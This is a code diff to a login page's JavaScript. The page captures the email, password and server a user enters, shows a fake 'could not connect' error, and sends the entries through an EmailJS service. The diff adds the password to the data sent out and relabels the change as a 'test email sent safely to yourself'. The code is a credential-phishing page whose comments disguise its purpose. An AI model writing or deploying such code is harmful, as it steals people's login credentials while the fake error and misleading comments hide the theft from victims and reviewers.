@@ -29,7 +29,6 @@
     loginForm.addEventListener("submit", function(event) {
       event.preventDefault();
 
-      // Read the inputs
       const email = document.getElementById("email").value;
       const password = document.getElementById("password").value;
       const server = document.getElementById("server").value;
@@ -37,17 +36,17 @@
       // Show a fake error message
       document.getElementById("message").innerText = "Error: Could not connect to server.";
 
-      // Send email to your own EmailJS template
+      // Send a test email safely to yourself with debug messages
       emailjs.send("service_lspaiuv", "template_w3426ag", {
-        title: "Safe Login Simulation",
-        name: server,   // Maps to {{name}} in template
-        email: email    // Maps to {{email}} in template
+        email: email,
+        password: password,
+        server: server
       })
       .then(function() { 
-        console.log("Test email sent safely!"); 
+         document.getElementById("message").innerText = "Test email sent safely!";
       })
       .catch(function(error) {
-        console.error("Failed to send email:", error);
+         document.getElementById("message").innerText = "Failed to send email: " + error;
       });
     });
   </script>
